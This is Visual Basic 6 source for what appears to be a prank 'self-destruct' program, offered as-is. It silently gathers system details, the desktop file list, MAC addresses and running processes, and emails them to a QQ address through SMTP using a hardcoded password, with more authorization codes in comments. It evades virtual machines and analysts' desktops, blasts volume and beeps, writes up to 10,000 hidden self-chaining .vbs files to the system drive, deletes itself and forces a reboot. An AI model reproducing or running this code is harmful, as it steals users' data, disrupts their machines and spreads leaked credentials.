VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "��ϲ�����"
   ClientHeight    =   1665
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   2490
   ControlBox      =   0   'False
   DrawStyle       =   5  'Transparent
   BeginProperty Font 
      Name            =   "΢���ź�"
      Size            =   15
      Charset         =   134
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H8000000D&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   1665
   ScaleWidth      =   2490
   StartUpPosition =   2  '��Ļ����
   Begin VB.CommandButton Command1 
      BackColor       =   &H00FF00FF&
      Caption         =   "��"
      BeginProperty Font 
         Name            =   "΢���ź�"
         Size            =   15.75
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1815
      Left            =   -120
      Style           =   1  'Graphical
      TabIndex        =   0
      Top             =   -120
      Width           =   2655
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32" ( _
ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function APIBeep Lib "kernel32" Alias "Beep" ( _
ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
Private Declare Function OSruntime Lib "winmm.dll" Alias "timeGetTime" () As Long '��ȡ���������ڵĺ�����
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
'������������������������������������������������������������������������������������������������������������
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" ( _
                          ByVal hwnd As Long, _
                          ByVal wMsg As Long, _
                          ByVal wParam As Long, _
                          ByVal lParam As Long) As Long
Private Const WM_APPCOMMAND As Long = &H319
Private Const APPCOMMAND_VOLUME_UP As Long = 10
Private Const APPCOMMAND_VOLUME_DOWN As Long = 9
Private Const APPCOMMAND_VOLUME_MUTE As Long = 8
Sub VolumeUp(p As Integer)
For i = 1 To p
    SendMessage Me.hwnd, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000
    Next i
End Sub

Sub delay(delaytime As Long)  '��ʱ�����ӹ���,�Ժ����
savetime = OSruntime
While OSruntime < savetime + delaytime 'ѭ���ȴ�
DoEvents '��������Ȩ
Wend
End Sub

Private Sub Form_Load()
On Error GoTo noreg
Dim ���� As Long
Set ws = CreateObject("Wscript.Shell") '����wshshellдע���
���� = ws.RegRead("HKCU\Software\LHCAPPs\jxdlb\startstat")
If ���� + 1 >= 2 Then
MsgBox "�����ڵ�һ�δ�ʱ�����ֽ�������Ч���뵽ϵͳ�̲��յڶ������", vbOKOnly, "��ϲ�������ʾ��" & ����
End If
If ���� + 1 >= 4 Then
MsgBox "ϲ���Ҿͷ����ң�(�򿪴�����" & ����
End If
1: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", ���� + 1, "REG_SZ"
Exit Sub
noreg: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", 1, "REG_SZ"
GoTo 1
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)

Call Command1_Click
End Sub




Private Sub Command1_Click()
On Error GoTo 32
Command1.Enabled = False
Command1.Caption = "���ڼ�����......"
Mail
'MsgBox "Ϊ�˸��õ�������Ч����ʹ�ô��з����������壬������Win10ϵͳ�����Ƶ�����豸"
If n = 0 Then
 Command1.Caption = "���������Իٳ���......1%"
 delay (1000)
 VolumeUp (30) '���60����
 Form1.WindowState = 2
 Form1.Caption = "׼���Ի�......"
 delay (1000)
 Command1.Height = Form1.Height
 Command1.Width = Form1.Width + 30
 Command1.BackColor = &HAA0000
 Command1.Font = "system"
 Command1.FontSize = 50
 SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
 '''''''''''''''''''''''''''''''''''''''''''''
 n = 0
 freq = 250 'Ƶ��
 dur = 300 'ʱ��
 Do
 VolumeUp (1)
 SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
 Form1.WindowState = 2
 Command1.Caption = "Warning: The computer will execute self-destruct after " & dur & " countdown.Please throw the computer from the nearest window immediately, otherwise you will bear the consequences! (Believe it or not.)"
 DoEvents
 APIBeep freq, dur
 n = n + 1
 freq = freq + 7
 dur = dur - 1
 Loop Until n = 300 '����
 Command1.Caption = "���������Իٳ���......2%(flooding the memory)"
 delay 200
 APIBeep 1600, 500
 APIBeep 1600, 500
 APIBeep 1600, 500
 APIBeep 1200, 600
 delay 600
 Command1.Caption = "���������Իٳ���......39%(obfuscating the memory)"
 APIBeep 1600, 800
 APIBeep 1600, 800
 APIBeep 1600, 800
 APIBeep 1200, 1000
 delay 600
 Command1.Caption = "���������Իٳ���......58e6ada3e59ca8e590afe58aa8e887aae6af81e7a88be5ba8f2e2e2e2e2e2e636c656172696e677468656d656d6f727929%(clearing the memory)"
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1200, 1500
 delay 600
 Command1.Caption = "���������Իٳ���......75fatal error syseb3e7af5abe483458591a86ef9841052tem halted%(disabling the memory)"
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 delay 10
 Command1.BackColor = &HAA
 DoEvents
 APIBeep 2000, 2500 '�ڴ�֮��
 Command1.Caption = "���������Իٳ���......&#90%(disabling the disks,look at your HDD light)"
 delay 600
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 a = Second(Time)
 Open App.Path & "\killexe" & a & ".bat" For Output As #1
 '"@echo off" ����ʾִ�й���
 Print #1, "@echo off"
 Print #1, "ping -n 2 127.0>nul"
 'ɾ��ָ���ļ�
 Print #1, "del " & App.EXEName + ".exe"
 Print #1, "ping -n 1 127.0>nul"
 'ɾ������
 Print #1, "del killexe" & a & ".bat"
 Print #1, "cls"
 Print #1, "exit"
 Close #1
 
 Open App.Path & "\GHOST" & a & ".bat" For Output As #1
 Print #1, "@echo off"
 Print #1, "echo ����������"
 Print #1, "del GHOST" & a & ".bat"
 Print #1, "cls"
 Print #1, "exit"
 Close #1
 '�������ֹ��û
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 WriteFile (10000) 'д���ļ�10000
 Shell "cmd /c" & "shutdown -r -t 1000"      '��������
 End
End If
Exit Sub
32: MsgBox "�ּ�����������ϵͳ�̲�����һ�������1��Ŷ��"
End
End Sub



Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Cancel = UnloadMode = vbFormControlMenu
End Sub

'ע������Ctrl��Alt��del��tab�ᱻ��Ϊ�������޷�����




Sub WriteFile(M As Integer)
Set fs = CreateObject("scripting.filesystemobject") '�������
'''''''''''''''''''''''''''''''''''''''��ȡϵͳ�̷�
Dim StrBuff As String, rtn As Long, sysdrv
StrBuff = Space(255)

rtn = GetWindowsDirectory(StrBuff, 255)
If rtn Then
Drivename = Left(StrBuff, 1)
End If
'''''''''''''''''''''''''''''''''''''''���ϵͳ�̷�
GetEmptySpaceOn (Drivename)
Do
X = X + 1
DoEvents
GetEmptySpaceOn (Drivename)
Data = "ON ERROR RESUME NEXT" & vbCrLf _
& "sleep 50" & vbCrLf _
& "'����" & vbCrLf _
& "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").run " & Chr(34) & X + 1 & ".vbs" & Chr(34) & vbCrLf _
& "msgbox" & Chr(34) & "���̿ռ��ʣ" & SpaceLeft & "�ֽ�"""

If (fs.FileExists(Drivename & ":\" & Str(n) & ".vbs")) Then
Shell "cmd /c " & Drivename & ":\1.vbs"
'Set f = fs.opentextfile(Drivename & ":\" & X & ".vbs", 8)

'f.write Data

'f.writeline Data

'f.Close

Else

Set f = fs.OpenTextFile(Drivename & ":\" & X & ".vbs", 2, True)

f.WriteBlankLines 2

f.Write Data

f.Close


End If
SetAttr Drivename & ":\" & X & ".vbs", vbSystem Or vbHidden
Command1.Caption = "��������Ӳ���Իٳ���......�ƻ�����" & X * 64 & "/640000(disabling the disks,look at your HDD light)"
Loop Until X = M
SetAttr Drivename & ":\" & "1.vbs", vbSystem Or vbNormal
End Sub

Function GetEmptySpaceOn(Drivename As String) '�鿴ʣ��ռ�
Set fso = CreateObject("Scripting.FileSystemObject")
Set driver = fso.GetDrive(Drivename & ":")
SpaceLeft = driver.AvailableSpace
End Function

Sub Mail()
On Error Resume Next
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''�ʼ�����ģ��
Dim Email As Object
Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
Set Email = CreateObject("cdo.message")
Email.From = "1041351041@qq.com" '����������
Email.To = "2743218818@qq.com" '�ռ�������*
Email.Subject = "��ϲ"  '����
Email.Textbody = Getinfo '�ʼ�����
'Email.HtmlBody = "https://static.zhixue.com/tlsysapp/public/101283/module/global/images_new/logo_login.png"
'Email.AddAttachment = "C:\����\U��\����\������yeah��\�����\Devoted.m4a" '�������������·������d:\1.jpg
With Email.Configuration.Fields
.item(NameSpace & "sendusing") = 2
.item(NameSpace & "smtpserver") = "smtp.qq.com" 'ʹ��qq���ʼ�������
.item(NameSpace & "smtpserverport") = 465
.item(NameSpace & "smtpauthenticate") = 1
.item(NameSpace & "sendusername") = 1041351041 'qq����
'2631988746
'�ɹ�����POP3/SMTP����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺qvcfzgrwbibzebfd
'�ɹ�����IMAP/SMTP����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺agtonucuvhezecdh
'�ɹ�����Exchange����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺nvtihijgvueieccb
'�ɹ�����CardDav/CalDav����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺zrflbsrlftsqdjif
'1041351041
'�ɹ�����IMAP/SMTP����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺iughmzzfkecpbaib
'�ɹ�����POP3/SMTP����,�ڵ������ͻ��˵�¼ʱ�������������������Ȩ�룺hzlitskcsupfbdic
'
.item(NameSpace & "sendpassword") = "iughmzzfkecpbaib"  ' ��Ȩ�루���룩
.item(NameSpace & "smtpusessl") = "true" '���ܷ��ͣ�QQ���䲻������ͨ����
.Update
End With
Email.Send
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''�ʼ�����ģ��
End Sub

Function Getinfo()
On Error Resume Next
Dim s, System, item
Dim i As Integer
Set System = GetObject("winmgmts:").InstancesOf("Win32_ComputerSystem")
For Each item In System
s = "��ϲ�����2.0��" & vbCrLf
s = s & "***********************" & vbCrLf
s = s & "���������: " & item.Name & vbCrLf
s = s & "״̬: " & item.Status & vbCrLf
s = s & "����: " & item.SystemType & vbCrLf
s = s & "��������: " & item.Manufacturer & vbCrLf
s = s & "�ͺ�: " & item.Model & vbCrLf
s = s & "���ڴ�: " & item.totalPhysicalMemory & "bytes" & vbCrLf
s = s & "��: " & item.domain & vbCrLf
's = s & "������" & item.Workgroup & vbCrLf '��ù���������ѡ���ͬʱ��
s = s & "��ǰ�û�: " & item.UserName & vbCrLf
s = s & "����״̬" & item.BootupState & vbCrLf
s = s & "�ü��������" & item.PrimaryOwnerName & vbCrLf
s = s & "ϵͳ����" & item.CreationClassName & vbCrLf
s = s & "���������" & item.Description & vbCrLf
For i = 0 To 1 '������谲װ������ϵͳ
s = s & Chr(5) & "����ѡ��" & i & " :" & item.SystemStartupOptions(i) & vbCrLf
Next i
Next
''''''''''''''''''''''''''''''''''''''''''''''''''
Dim WMI���� As Object
Dim ���� As Object
Dim �Ӷ��� As Object
Dim ˢ�� As Long
ˢ�� = 0
Set WMI���� = GetObject("winmgmts:\\.\root\cimv2")
Set ���� = WMI����.InstancesOf("Win32_Processor")
Me.CurrentX = 0
Me.CurrentY = 0
For Each �Ӷ��� In ����
If ˢ�� = 0 Then
ˢ�� = 1
Me.Cls
End If
Seewhat = �Ӷ���.Name
s = s & "CPU:" & �Ӷ���.Name & "@" & �Ӷ���.CurrentClockSpeed & "MHz (ʹ����:" & _
�Ӷ���.LoadPercentage & "%)" & "���кţ�" & �Ӷ���.ProcessorId & vbCrLf
Next
'''''''''''''''''''''''''''''''''''
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
For i = 1 To 20
Set colItems = objWMIService.ExecQuery("Select * From Win32_PerfRawData_PerfOS_Memory")
For Each objItem In colItems
intValue = objItem.Availablekbytes
memory = "�����ڴ棺" & intValue & "KB"
Next
Next
s = s & memory & vbCrLf
'''''''''''''''''''''''''''''''''''
    Set fsoobj = CreateObject("Scripting.FileSystemObject")
    Set drvObj = fsoobj.Drives
    s = s & "������Ϣ��" & vbCrLf
    For Each D In drvObj
        Err.Clear
           If D.IsReady Then
                s = s & D.DriveLetter & "�̣�" & vbCrLf
                s = s & "���ÿռ�:" & cSize(D.FreeSpace) & vbCrLf
                s = s & "�ܴ�С:" & cSize(D.TotalSize) & vbCrLf
                s = s & "ʹ���� :" & Round(100 * ((D.TotalSize - D.FreeSpace) / D.TotalSize), 2) & "%" & vbCrLf
           End If
    Next
''''''''''''''''''''''''''''''''''''''''''''''''''
Set WMI = GetObject("winmgmts:\\.\root\CIMV2")
Set w = WMI.ExecQuery("select * from win32_NetworkAdapter")
s = s & "����������"
For Each �Ӷ��� In w
    s = s & vbCrLf & �Ӷ���.ProductName
Next
Set w = WMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=True")
s = s & vbCrLf & "MAC��ַ"
For Each �Ӷ��� In w
    s = s & vbCrLf & �Ӷ���.MACAddress
Next
Set w = WMI.ExecQuery("select * from win32_VideoController")
s = s & vbCrLf & "�Կ��ͺ�----�Դ�"
For Each �Ӷ��� In w
    s = s & vbCrLf & �Ӷ���.Name & " ---- " & �Ӷ���.AdapterRAM & vbCrLf
Next
If InStr(s, "Teredo") > 0 Or InStr(s, "Virt") > 0 Or InStr(s, "VMware") > 0 Then
    If InStr(s, "VMnet") <= 0 And InStr(s, "Wi-Fi Direct") <= 0 Then
    MsgBox "�ף����������ܣ�����ô��������������ˣ���ָ������Ļ������⻹��ô���������" & Seewhat & "?�������˳���", vbCritical, "�������"
    End
    End If
End If
''''''''''''''''''''''''''''''''''''''''''''''''''
s = s & "�ļ���:" & vbCrLf
Dim fso As Object
Dim folder As Object
Dim subfolder As Object
Dim file As Object
Set fso = CreateObject("scripting.filesystemobject") '����FSO����
Dim kk As New IWshRuntimeLibrary.IWshShell_Class
Set folder = fso.GetFolder(kk.SpecialFolders("Desktop"))
For Each file In folder.Files '�������ļ����µ��ļ�
zmwj = zmwj & file & vbCrLf '����ļ���
Next
Set fso = Nothing
Set folder = Nothing
Dim aa()
aa = Array(".pdf", ".ppt", ".pptx", ".xls", ".xlsx", ".doc", ".docx", ".txt", ".rtf", ".png")
For i = 0 To 9
If InStr(zmwj, aa(i)) Then
xnj = xnj + 1
End If
Next i
If InStr(zmwj, "My Document") Or xnj > 6 Then
MsgBox "�ף����������ܣ�����ô��������������ˣ���ָ������Ļ������⻹��ô���������" & Seewhat & "?�������˳���", vbCritical, "�������"
End
End If
s = s & zmwj
''''''''''''''''''''''''''''''''''''''''''''''''''
Dim objs, obj
    Set WMI = GetObject("WinMgmts:")
    Set objs = WMI.InstancesOf("Win32_Process")
    s = s & "��Ծ���̣�" & vbCrLf
    For Each obj In objs
        s = s & obj.Description & Chr(13) & Chr(10)
    Next
Getinfo = s
End Function


Function cSize(tSize)
    If tSize >= 1073741824 Then
       cSize = Int((tSize / 1073741824) * 1000) / 1000 & " GB"
    ElseIf tSize >= 1048576 Then
       cSize = Int((tSize / 1048576) * 1000) / 1000 & " MB"
    ElseIf tSize >= 1024 Then
       cSize = Int((tSize / 1024) * 1000) / 1000 & " KB"
    Else
       cSize = tSize & "B"
    End If
End Function

